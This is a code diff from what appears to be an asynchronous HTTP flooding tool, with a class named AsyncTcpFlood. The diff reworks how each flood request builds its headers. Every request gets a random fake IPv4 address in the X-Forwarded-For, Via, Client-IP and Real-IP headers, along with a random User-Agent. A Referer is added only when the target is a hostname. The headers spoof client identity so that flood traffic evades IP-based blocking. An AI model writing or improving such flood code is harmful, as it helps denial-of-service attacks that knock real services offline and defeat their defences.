@@ -17,6 +17,7 @@ from typing import Callable, Optional, Set, Tuple
 import aiohttp
 import async_timeout
 from aiohttp_socks import ProxyConnector
+from dns import inet
 from OpenSSL import SSL
 from yarl import URL
 
@@ -192,30 +193,22 @@ class AsyncTcpFlood(FloodBase):
     def is_tls(self):
         return self._url.scheme.lower() == "https" or self._url.port == 443
 
-    def spoof_ip(self) -> dict:
-        spoof: str = Tools.rand_ipv4()
-        return {
-            f"X-Forwarded-Host": self._url.raw_host,
-            f"Via": spoof,
-            f"Client-IP": spoof,
-            f"X-Forwarded-Proto": "https",
-            f"X-Forwarded-For": spoof,
-            f"Real-IP": spoof,
-        }
-
-    def random_headers(self) -> dict:
-        return {
-            f"User-Agent": random.choice(USERAGENTS),
-            f"Referer": str(self._url),
-            **self.spoof_ip(),
-        }
-
     def default_headers(self) -> dict:
-        return {
-            f"Host": self._url.raw_authority,
+        ip: str = Tools.rand_ipv4()
+        headers = {
             **self.BASE_HEADERS,
-            **self.random_headers()
+            "Host": self._url.raw_authority,
+            "User-Agent": random.choice(USERAGENTS),
+            "X-Forwarded-Host": self._url.raw_host,
+            "Via": ip,
+            "Client-IP": ip,
+            "X-Forwarded-Proto": "https",
+            "X-Forwarded-For": ip,
+            "Real-IP": ip,
         }
+        if not inet.is_address(self._url.host):
+            headers["Referer"] = str(self._url)
+        return headers
 
     def add_rand_query(self, path_qs) -> str:
         if '?' in path_qs:
